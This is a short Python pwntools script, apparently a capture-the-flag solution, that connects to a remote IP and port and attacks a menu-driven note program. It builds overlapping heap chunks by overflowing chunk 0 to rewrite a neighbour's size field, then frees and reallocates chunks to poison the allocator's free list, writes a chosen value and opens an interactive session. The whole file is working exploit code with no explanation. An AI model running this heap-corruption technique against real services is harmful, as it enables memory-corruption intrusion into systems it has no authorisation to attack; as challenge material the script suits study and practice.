from pwn import *
io=remote("39.108.238.37","55555")

def add(size,data):
    io.recvuntil('5,exit\n')
    io.sendline('1')
    io.recvuntil('size')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)

def delete(index):
    io.recvuntil('5,exit\n')
    io.sendline('2')
    io.recvuntil('idx:')
    io.sendline(str(index))

def edit(index,data):
    io.recvuntil('5,exit\n')
    io.sendline('4')
    io.recvuntil('idx:')
    io.sendline(str(index))
    io.recvuntil('content:')
    io.send(data)

def show(index):
    io.recvuntil('5,exit\n')
    io.sendline('3')
    io.recvuntil('idx')
    io.sendline(str(index))

add(16,'aaaa')#0
add(16,'bbbb')#1
add(16,'cccc')#2
add(16,'dddd')#3

delete(3)
delete(2)
edit(0,'a'*0x18+p64(0x41))
delete(1)
add(0x30,'a'*0x18+p64(0x21)+p8(0))
add(16,'aaaaaa')
add(16,p64(0x66666666))
io.sendline('5')

io.interactive()